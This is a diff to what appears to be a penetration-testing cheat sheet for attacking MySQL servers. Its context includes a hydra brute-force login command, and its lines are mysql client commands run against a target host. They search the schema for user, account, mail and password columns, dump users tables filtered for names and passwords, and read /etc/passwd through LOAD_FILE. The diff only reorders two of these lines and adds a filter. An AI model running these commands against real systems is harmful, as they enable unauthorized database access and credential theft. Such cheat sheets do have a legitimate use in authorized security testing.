@@ -1402,12 +1402,12 @@ hydra -I mysql://$TARGET -L /tmp/mysqlusernames -P /tmp/mysqlpasswords -e n -t15
 +---------- Executing Queries ----------+
 mysql -h localhost -u root --skip-ssl -p'root' -e 'show databases;'
 mysql -h localhost -u $USERNAME --skip-ssl -p'$PASSWORD' -e 'show databases;'
+mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name,column_name FROM information_schema.columns" | grep 'passw'
+mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "USE db_name; SELECT * FROM users\G;" | grep -Ei 'name|passw'
 mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'user'
 mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'account'
 mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'mail'
 mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'db'
-mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name,column_name FROM information_schema.columns" | grep 'passw'
-mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "USE db_name; SELECT * FROM users\G;"
 mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT @@version, @@hostname, user();"
 mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT LOAD_FILE('/etc/passwd')\G;"
 
